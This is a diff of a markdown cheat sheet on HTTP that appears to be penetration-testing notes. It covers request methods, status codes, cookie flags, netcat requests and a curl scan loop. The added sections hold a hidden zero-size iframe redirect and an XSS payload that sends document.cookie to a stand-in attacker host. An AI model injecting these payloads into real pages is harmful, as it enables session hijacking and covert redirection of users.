@@ -1,9 +1,11 @@
-# Request methods
+# HTTP
+
+## Request methods
 
 * GET: Passes all query material in the URL query string.
 * POST: Passes all requested data in the HTTP request body.
 
-# Response codes
+## Response codes
 
 * 1xx  Informational
 * 100  Continue
@@ -20,12 +22,12 @@
 * 5xx  Server Error
 * 500  Internal Server Error
 
-# Cookies
+## Cookies
 
 * Secure: only send over encrypted channel
 * HttpOnly: prevents JavaScript from accessing the cookie
 
-# Request with netcat, telnet
+## Request with netcat, telnet
 
 ```bash
 nc <target> 80
@@ -36,3 +38,16 @@ HEAD / HTTP/1.1
 ```bash
 for i in `cat list.txt` ; do curl -isk -X HEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
 ```
+
+## Browser redirection
+
+```html
+<iframe SRC="http://hacker/document" height="0" width="0">
+```
+
+## Cookie stealing
+
+```html
+<script>new Image().src="http://hacker/img.png?"+ document.cookie;</script>
+```
+
